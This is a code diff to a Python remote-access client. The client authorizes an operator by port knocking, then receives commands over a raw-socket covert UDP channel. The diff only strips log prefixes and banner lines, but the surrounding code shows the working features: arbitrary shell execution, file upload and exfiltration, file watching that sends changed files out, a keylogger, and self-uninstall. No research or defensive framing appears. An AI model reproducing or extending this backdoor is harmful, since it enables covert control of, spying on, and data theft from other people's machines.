@@ -111,8 +111,8 @@ class Client:
 
             if list(knock_data['knocks']) == self.knock_sequence:
                 print(f"\n{'=' * 60}")
-                print(f"[+] VALID KNOCK SEQUENCE from {ip_address}")
-                print(f"[+] Authorizing for covert channel communication")
+                print(f"VALID KNOCK SEQUENCE from {ip_address}")
+                print(f"Authorizing for covert channel communication")
                 print(f"{'=' * 60}\n")
                 knock_data['knocks'].clear()
                 self.authorized_ips.add(ip_address)
@@ -128,7 +128,7 @@ class Client:
         with self.lock:
             if ip_address in self.authorized_ips:
                 self.authorized_ips.remove(ip_address)
-                print(f"[*] Revoked authorization for {ip_address}")
+                print(f"Revoked authorization for {ip_address}")
 
     def listen_for_knocks(self, port):
         """Thread target: listen for TCP knocks on a single port."""
@@ -139,22 +139,22 @@ class Client:
         try:
             sock.bind(('0.0.0.0', port))
             sock.listen(5)
-            print(f"[*] Knock listener on TCP port {port}")
+            print(f"Knock listener on TCP port {port}")
 
             while self.running:
                 try:
                     conn, addr = sock.accept()
                     ip_address = addr[0]
-                    print(f"[+] Knock on port {port} from {ip_address}")
+                    print(f"Knock on port {port} from {ip_address}")
                     self.record_knock(ip_address, port)
                     conn.close()
                 except socket.timeout:
                     continue
                 except Exception as e:
                     if self.running:
-                        print(f"[!] Error on knock port {port}: {e}")
+                        print(f"Error on knock port {port}: {e}")
         except Exception as e:
-            print(f"[!] Failed to bind to port {port}: {e}")
+            print(f"Failed to bind to port {port}: {e}")
         finally:
             sock.close()
 
@@ -177,8 +177,8 @@ class Client:
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-            print(f"[*] Covert channel listener on UDP port {self.command_port}")
-            print("[*] Waiting for covert packets...")
+            print(f"Covert channel listener on UDP port {self.command_port}")
+            print("Waiting for covert packets...")
             print()
 
             state = self._reset_transfer_state()
@@ -200,7 +200,7 @@ class Client:
                         continue
 
                     if not self.is_authorized(src_ip):
-                        print(f"[!] Unauthorized covert packet from {src_ip}  ignoring")
+                        print(f"Unauthorized covert packet from {src_ip}  ignoring")
                         continue
 
                     seq = parsed["seq"]
@@ -209,7 +209,7 @@ class Client:
                     command_code = parsed["command"]
 
                     if state['current_src_ip'] is not None and src_ip != state['current_src_ip']:
-                        print(f"[!] Source IP changed mid-transfer "
+                        print(f"Source IP changed mid-transfer "
                               f"({state['current_src_ip']} {src_ip}) resetting state")
                         state = self._reset_transfer_state()
 
@@ -237,7 +237,7 @@ class Client:
                         received_seqs = set(state['chunks'].keys())
                         if expected_seqs != received_seqs:
                             missing = expected_seqs - received_seqs
-                            print(f"[!] Missing sequences {missing}  dropping command")
+                            print(f"Missing sequences {missing}  dropping command")
                             state = self._reset_transfer_state()
                             continue
 
@@ -254,7 +254,7 @@ class Client:
                         try:
                             command_type = CommandType(state['current_command'])
                         except ValueError:
-                            print(f"[!] Unknown command code: 0x{state['current_command']:04X}")
+                            print(f"Unknown command code: 0x{state['current_command']:04X}")
                             state = self._reset_transfer_state()
                             continue
 
@@ -275,17 +275,17 @@ class Client:
                 except KeyboardInterrupt:
                     break
                 except Exception as e:
-                    print(f"[!] Error receiving covert packet: {e}")
+                    print(f"Error receiving covert packet: {e}")
                     continue
 
             sock.close()
 
         except PermissionError:
-            print("[!] Raw sockets require root privileges")
-            print("[!] Run with: sudo python3 client.py")
+            print("Raw sockets require root privileges")
+            print("Run with: sudo python3 client.py")
             sys.exit(1)
         except Exception as e:
-            print(f"[!] Fatal error: {e}")
+            print(f"Fatal error: {e}")
             sys.exit(1)
 
     # ------------------------------------------------------------------ #
@@ -296,12 +296,12 @@ class Client:
         """Dispatch and handle a fully-reassembled command."""
 
         if command_type == CommandType.DISCONNECT:
-            print("[*] Processing DISCONNECT")
+            print("Processing DISCONNECT")
             print(f"    Closing session with {src_ip}")
             # Authorization is revoked by the caller after this returns
 
         elif command_type == CommandType.UNINSTALL:
-            print("[*] Processing UNINSTALL")
+            print("Processing UNINSTALL")
             print("    Sending ACK then uninstalling...")
             # Send ACK BEFORE deleting the script so the response goes out
             self.send_response(src_ip, CommandType.ACK,
@@ -314,7 +314,7 @@ class Client:
                 print(f"    Could not remove script: {e}")
 
         elif command_type == CommandType.TRANSFER_TO_CLIENT:
-            print("[*] Processing TRANSFER_TO_CLIENT")
+            print("Processing TRANSFER_TO_CLIENT")
             try:
                 filename_length = struct.unpack('!H', payload[:2])[0]
                 filename = payload[2:2 + filename_length].decode('utf-8')
@@ -332,7 +332,7 @@ class Client:
 
         elif command_type == CommandType.TRANSFER_FROM_CLIENT:
             filepath = payload.decode('utf-8', errors='ignore').replace('\x00', '').strip()
-            print(f"[*] Processing TRANSFER_FROM_CLIENT: {filepath}")
+            print(f"Processing TRANSFER_FROM_CLIENT: {filepath}")
             try:
                 with open(filepath, 'rb') as f:
                     content = f.read()
@@ -344,7 +344,7 @@ class Client:
 
         elif command_type == CommandType.RUN_COMMAND:
             cmd = payload.decode('utf-8', errors='ignore').replace('\x00', '').strip()
-            print(f"[*] Processing RUN_COMMAND: {cmd}")
+            print(f"Processing RUN_COMMAND: {cmd}")
             try:
                 result = subprocess.run(
                     cmd, shell=True,
@@ -364,7 +364,7 @@ class Client:
         elif command_type == CommandType.FILE_WATCH:
             filepath = payload.decode('utf-8', errors='ignore').replace('\x00', '').strip()
             filepath = os.path.abspath(os.path.expanduser(filepath))
-            print(f"[*] Processing FILE_WATCH: {filepath}")
+            print(f"Processing FILE_WATCH: {filepath}")
             try:
                 self._stop_file_watcher()
 
@@ -397,7 +397,7 @@ class Client:
 
                         for event in i.event_gen(yield_nones=True):
                             if self._watcher_stop.is_set():
-                                print("[*] File watcher stopped.")
+                                print("File watcher stopped.")
                                 break
                             if event is None:
                                 continue
@@ -434,9 +434,9 @@ class Client:
                                         name_bytes = send_name.encode('utf-8')
                                         pkt_payload = struct.pack('!H', len(name_bytes)) + name_bytes + filedata
                                         self.send_response(src_ip, CommandType.FILE_WATCH, pkt_payload)
-                                        print(f"[*] Watcher: sent '{send_name}' ({len(filedata)} bytes)")
+                                        print(f"Watcher: sent '{send_name}' ({len(filedata)} bytes)")
                                     except Exception as e:
-                                        print(f"[!] Watcher: could not send '{filename}': {e}")
+                                        print(f"Watcher: could not send '{filename}': {e}")
 
                                 elif event_name == 'IN_DELETE':
                                     # Double-check target_file match inside event loop
@@ -445,17 +445,17 @@ class Client:
                                     send_name = target_file or filename
                                     self.send_response(src_ip, CommandType.FILE_DELETE,
                                                        send_name.encode('utf-8'))
-                                    print(f"[*] Watcher: notified deletion of '{send_name}'")
+                                    print(f"Watcher: notified deletion of '{send_name}'")
 
                                 elif event_name in ('IN_DELETE_SELF', 'IN_MOVE_SELF'):
-                                    print(f"[*] Watcher: watched path was deleted or moved, stopping.")
+                                    print(f"Watcher: watched path was deleted or moved, stopping.")
                                     self._watcher_stop.set()
                                     break
 
                     except Exception as e:
                         import traceback
                         traceback.print_exc()
-                        print(f"[!] Watcher thread error: {e!r}")
+                        print(f"Watcher thread error: {e!r}")
 
                 self._watcher_stop.clear()
                 self._watcher_thread = threading.Thread(target=run_watcher, daemon=True)
@@ -467,7 +467,7 @@ class Client:
                 self.send_response(src_ip, CommandType.ERROR, str(e).encode())
 
         elif command_type == CommandType.STOP_WATCH:
-            print("[*] Processing STOP_WATCH")
+            print("Processing STOP_WATCH")
             self._stop_file_watcher()
             print("    File watcher stopped.")
 
@@ -498,7 +498,7 @@ class Client:
             print(f"    Keylogger started")
 
         elif command_type == CommandType.KEYLOG_END:
-            print("[*] Processing KEYLOG_END")
+            print("Processing KEYLOG_END")
             self._stop_keylogger()
             time.sleep(0.2)  # give keylogger thread time to flush and close the file
             print("    Keylogger stopped.")
@@ -517,7 +517,7 @@ class Client:
     def _stop_file_watcher(self):
         """Stop the active file watcher thread if running."""
         if self._watcher_thread and self._watcher_thread.is_alive():
-            print("[*] Stopping existing file watcher...")
+            print("Stopping existing file watcher...")
             self._watcher_stop.set()
             self._watcher_thread.join(timeout=3)
             self._watcher_thread = None
@@ -526,7 +526,7 @@ class Client:
     def _stop_keylogger(self):
         """Stop the active file watcher thread if running."""
         if self._keylogger_thread and self._keylogger_thread.is_alive():
-            print("[*] Stopping existing keylogger...")
+            print("Stopping existing keylogger...")
             self._keylogger_stop.set()
             self._keylogger_thread.join(timeout=3)
             self._keylogger_thread = None
@@ -562,13 +562,10 @@ class Client:
             return "127.0.0.1"
 
     def start(self):
-        print("=" * 60)
         print("Client - Port Knock + Raw Socket Covert Channel")
-        print("=" * 60)
         print(f"Knock sequence: {self.knock_sequence}")
         print(f"Knock timeout:  {self.knock_timeout}s")
         print(f"Command port:   UDP {self.command_port}")
-        print("=" * 60)
         print()
 
         os.makedirs(os.path.join(os.getcwd(), TMP_DIR), exist_ok=True)
@@ -629,7 +626,7 @@ def main():
         try:
             knock_sequence = [int(sys.argv[1]), int(sys.argv[2]), int(sys.argv[3])]
         except ValueError:
-            print("[!] Knock ports must be integers")
+            print("Knock ports must be integers")
             sys.exit(1)
     else:
         knock_sequence = KNOCK_SEQUENCE  # default [7000, 8000, 9000]
